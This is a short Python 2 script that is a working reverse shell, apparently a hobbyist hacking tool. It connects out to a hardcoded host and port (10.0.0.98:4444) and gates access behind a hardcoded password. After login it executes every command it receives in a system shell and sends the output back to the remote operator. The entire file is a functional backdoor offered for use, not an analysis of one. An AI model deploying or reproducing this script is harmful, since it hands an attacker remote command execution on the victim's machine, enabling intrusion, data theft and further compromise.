#!/usr/bin/python

# Import the required librarys for the job
import subprocess
import socket
import os

# Set variables used in the script
HOST = '10.0.0.98' # IP for remote connection
PORT = 4444 # Port for remote connection
PASS = 'Te$t!2#456' # For making the script secure

# Create the socket that will be used
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# This method will be used for handling the exit when you type -quit
def Quit():
       s.send('    [<] Hope to see you soon :)\n')
       s.close()
       Connect()

# This method will wait until the connection is alive
def Connect():
       s.connect((HOST, PORT))                                                                                      
       s.send('''\n
    +--------------------+
    | You are connected! |
    +--------------------+
    | X IS Something err!! |
    | < IS Incomming!!     |
    | > IS Outgoing!!       |
    +--------------------+

    ''')
       Login()

# Ask for login; if they do not get it right it will ask again ect ect etc
def Login():
       s.send('    [>] Please login #>> ')
       pwd = s.recv(1024)

       if pwd.strip() == PASS:
              Shell()
       else:
              s.send('    [X] Incorrect Login!!\n')
              Login()

# Main method -- Hope I'm not pissing you off by calling it a method, I'm used to C# lol ;)
def Shell():
       s.send('    [<] We\'re in :)\n    [>]-{ ' + os.curdir + ' } Console #>> ')
       while 1:
           data = s.recv(1024)

           # Make sure that you use '-quit'!!
           if data.upper()[:5] == '-QUIT' : break

           proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
           stdoutput = "    [<] " + proc.stdout.read() + proc.stderr.read()
           s.send('\n\n' + stdoutput + '\n\n')
           s.send('    [>]-{ ' + os.curdir + ' } Console #>> ')
       Quit()
Connect()